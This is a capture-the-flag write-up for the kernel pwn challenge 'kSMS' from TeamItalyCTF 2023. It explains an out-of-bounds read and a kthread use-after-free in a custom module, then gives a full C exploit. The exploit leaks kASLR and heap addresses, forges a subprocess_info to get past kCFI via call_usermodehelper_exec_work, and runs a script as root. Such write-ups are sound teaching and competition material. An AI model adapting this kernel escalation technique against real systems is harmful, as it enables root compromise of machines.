# TeamItalyCTF 2023

## [pwn] kSMS (0 solves)

## Overview  
Kernel is compiled with kCFI, and the rest of the config is pretty much
[COS](https://cos.googlesource.com/third_party/kernel/+/refs/heads/cos-6.1/arch/x86/configs/lakitu_defconfig)
with some modifications.  
Many syscalls are disabled (msgmsg, io_uring, netfilter, ...), either through
the kconfig or through the seccomp policy of the nsjail.  

## Intended solution  
The kmod has two (intended) vulnerabilities:  
- OOB read in `CMD_READ_MESSAGE`  
- UAF in the `redact_loop` kthread

### OOB read  
`m->consumed += args->len;`  
The only tricky part is that the kernel is compiled with `HARDENED_USERCOPY`
so the oob read must not read data across the boundaries of a slub object.  

### UAF  
While the kthread is sleeping (`msleep(min_lifetime)`) it's still possible to
free a `secure_message` entry from the array as the kthread still has a
reference in the `struct secure_message *m` variable.  
After sleeping the kthread will call `schedule_work(&m->work)`.  

If we reclaim the message object before `schedule_work` is called we would be
able to call an arbitrary function pointer, however kCFI is enabled and we can
only call functions with the same signature as `void redact_message(struct
work_struct *work)`.  

The intended solution to bypass kCFI is to overwrite `work->func` with `void
call_usermodehelper_exec_work(struct work_struct *work)`,
[link](https://elixir.bootlin.com/linux/v6.2.16/source/kernel/umh.c#L161).  
Its enough to craft a fake `struct subprocess_info` when reclaiming the freed
message object to execute arbitrary commands as root and read the flag from
`/dev/sda`.  

## Exploit  
```c  
// musl-gcc exploit.c -o exploit -static -O0 && strip exploit  
#include <stdio.h>  
#include <fcntl.h>  
#include <err.h>  
#include <string.h>  
#include <stdint.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <sys/ioctl.h>  
#include <sys/mman.h>  
#include <assert.h>  
#include <sys/socket.h>  
#include <sys/stat.h>  
#include <sys/types.h>  
#include <sys/wait.h>

#define CMD_ADD_MESSAGE 0x11111111  
#define CMD_READ_MESSAGE 0x22222222  
#define CMD_DELETE_MESSAGE 0x33333333

void err_exit(int code, char *msg) {  
   puts("[-] EXPLOIT FAILED");  
   err(code, msg);  
}

void hexprint(char *buffer, unsigned int bytes) {  
   uint64_t *buf = (uint64_t*)buffer;  
   int dqwords = ((bytes + 0x10 - 1) & 0xfffffff0) / 0x10;  
   for (int i = 0; i < (dqwords * 2); i += 2)  
       if (buf[i] || buf[i+1])  
           printf("0x%04x: 0x%016lx 0x%016lx\n", (i * 0x8), buf[i], buf[i+1]);  
   puts("-----------------------------------------------");  
   return;  
}

typedef struct params {  
   void *buf;  
   uint32_t lifetime;  
   uint32_t len;  
   uint32_t idx;  
} params_t;

typedef struct work_struct {  
	uint64_t data;  
	uint64_t next, prev;  
	uint64_t func;  
} work_struct_t;

typedef struct secure_message {  
   work_struct_t work;  
   uint32_t lifetime;  
   uint32_t consumed;  
   uint32_t content_size;  
} secure_message_t;

typedef struct subprocess_info {  
	work_struct_t work;  
	uint64_t complete;  
	uint64_t path;  
	uint64_t argv;  
	uint64_t envp;  
	uint32_t wait;  
	uint32_t retval;  
	uint64_t init;  
	uint64_t cleanup;  
	uint64_t data;  
	/* size: 96, cachelines: 2, members: 10 */  
} subprocess_info_t;

int fd;

int add_secmsg(char *buf, uint32_t len, uint32_t lifetime) {  
   params_t args = {  
       .buf = buf,  
       .len = len,  
       .lifetime = lifetime  
   };  
   if (ioctl(fd, CMD_ADD_MESSAGE, &args) < 0)  
       err_exit(1, "CMD_ADD_MESSAGE");  
   return args.idx;  
}

void read_secmsg(uint32_t idx, char *buf, uint32_t len) {  
   params_t args = {  
       .idx = idx,  
       .buf = buf,  
       .len = len  
   };  
   args.buf = buf;  
   args.len = len;  
   ioctl(fd, CMD_READ_MESSAGE, &args);  
}

void delete_secmsg(uint32_t idx) {  
   params_t args = {  
       .idx = idx  
   };  
   if (ioctl(fd, CMD_DELETE_MESSAGE, &args) < 0)  
       err_exit(1, "CMD_DELETE_MESSAGE");  
}

int main() {  
   params_t args;  
   uint64_t kaslr_leak, kaslr_base, heap_leak_1, heap_leak_2, q1;  
   char buf[0x500] = {0};  
   char buf2[0x500] = {0};  
   char buf3[0x1000] = {0};  
   int victim_idx, leak_idx;  
   int found = 0;  
   int ss[2];

   memset(buf, 0x41, sizeof(buf));  
   memset(buf3, 0x43, sizeof(buf3));

   fd = open("/dev/secmsg_storage", O_RDONLY);  
   if (fd < 0)  
       err_exit(1, "open");

   if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss) < 0)  
           err_exit(1, "[-] socketpair 1");

   puts("lesgo");

   /*  
       Write payload to file  
   */  
   system("echo -e '#!/bin/sh\ncat /dev/sda > /jail/flag\nchmod 666
/jail/flag' > /jail/a; chmod +x /jail/a");

   /*  
       Leak kASLR  
   */  
   for (int i = 0; i < 20; i++)  
       open("/dev/ptmx", O_RDWR | O_NOCTTY);

   leak_idx = add_secmsg(buf, 600, 1001);

   for (int i = 20; i < 40; i++)  
       open("/dev/ptmx", O_RDWR | O_NOCTTY);

   read_secmsg(leak_idx, buf2, 0x400 - 44);  
   read_secmsg(leak_idx, buf2, 0x100);

   hexprint(buf2, 0x100);

   kaslr_leak = ((uint64_t*)buf2)[3];

   printf("[*] kaslr_leak : 0x%lx\n", kaslr_leak);

   if ((kaslr_leak & 0xffffffff00000fffULL) == 0xffffffff00000968ULL) {  
       kaslr_base = kaslr_leak - 0x1275968;  
       printf("[*] kaslr_base : 0x%lx\n", kaslr_base);  
   } else if ((kaslr_leak & 0xffffffff00000fffULL) == 0xffffffff00000860ULL) {  
       kaslr_base = kaslr_leak - 0x1275860;  
       printf("[*] kaslr_base : 0x%lx\n", kaslr_base);  
   } else {  
       delete_secmsg(leak_idx);  
       exit(1);  
   }

   sleep(2);

   delete_secmsg(leak_idx);

   puts("[+] freed");  
   sleep(1);  
   /* */

   /*  
       Leak heap  
   */  
   for (int i = 0; i < 7; i++) {  
       *((uint32_t*)buf) = i;  
       add_secmsg(buf, 0x100, 1001 + i);  
   }

   for (int i = 0; i < 7; i++) {  
       read_secmsg(i, buf2, 0x200 - 44);  
       read_secmsg(i, buf2, 0x100);

       q1 = ((uint64_t*)buf2)[0];  
       heap_leak_1 = ((uint64_t*)buf2)[1];  
       heap_leak_2 = ((uint64_t*)buf2)[2];

       if (q1 == 0x0000000fffffffe0ULL &&  
           heap_leak_1 == heap_leak_2  &&  
           ((heap_leak_1 & 0xffff000000000000) == 0xffff000000000000)) {  
           found = 1;  
           victim_idx = ((uint32_t*)buf2)[11];  
           printf("[*] heap leak 1 : 0x%lx\n", heap_leak_1);  
           printf("[*] heap leak 2 : 0x%lx\n", heap_leak_2);  
           printf("[*] victim idx : %d\n", victim_idx);  
           hexprint(buf2, 0x100);  
           break;  
       }  
   }

   if (!found)  
       err_exit(1, "no heap leak");

   sleep(3);  
   /* */

   /*  
       UAF and overwrite work  
   */  
   memset(buf, 0x44, sizeof(buf));

   delete_secmsg(victim_idx);

   puts("[+] freed victim idx 1");

   victim_idx = add_secmsg(buf, 0x100, 5000 - 1);  
   printf("[+] re-allocated victim idx %d\n", victim_idx);

   // make sure kthread is sleeping on our thread  
   sleep(2);

   delete_secmsg(victim_idx);  
   puts("[+] freed victim idx 2");

   memset(buf, 0x45, sizeof(buf));

   heap_leak_1 -= 0x8;

   subprocess_info_t *info = (subprocess_info_t*)buf;  
   info->work.data = 0x0000000fffffffe0;  
   info->work.func = kaslr_base + 0xcb9b0; // call_usermodehelper_exec_work  
   info->work.prev = heap_leak_1 + 0x8;  
   info->work.next = heap_leak_1 + 0x8;  
   info->path = heap_leak_1 + 0x70;  
   info->argv = heap_leak_1 + 0x80;  
   info->envp = 0x0;  
   info->cleanup = 0x0;  
   info->init = 0x0;  
   info->data = 0x0;  
   info->complete = 0x0;  
   info->wait = 0x2; // UMH_WAIT_PROC;

   strcpy(buf + 0x70, "/jail/a");  
   *(uint64_t*)(buf + 0x80) = heap_leak_1 + 0x70;  
   *(uint64_t*)(buf + 0x88) = 0x0;

   if (write(ss[0], buf, 512 - 0x140) < 0)  
       err_exit(1, "[-] write");  
   puts("[*] reclaimed victim");

   puts("[+] waiting for cmd to be executed...");  
   sleep(5);  
   puts("[+] cmd should be done");

   puts("[+] fixing skb alloc");  
   memset(buf, 0x0, sizeof(buf));  
   add_secmsg(buf, 0x100, 5000 - 1);  
   puts("[+] done");

   puts("[+] reading flag");  
   system("cat /jail/flag");  
   puts("");  
   puts("[+] expl done");  
   return 0;  
}  
```

## Flag  
`flag{g00d_j0b_1f_y0u_us3d_5ubpr0c3ss_1nf0_t0_byp455_kcf1_s0_3z}`

Original writeup
(https://github.com/TeamItaly/TeamItalyCTF-2023/blob/master/kSMS/README.md).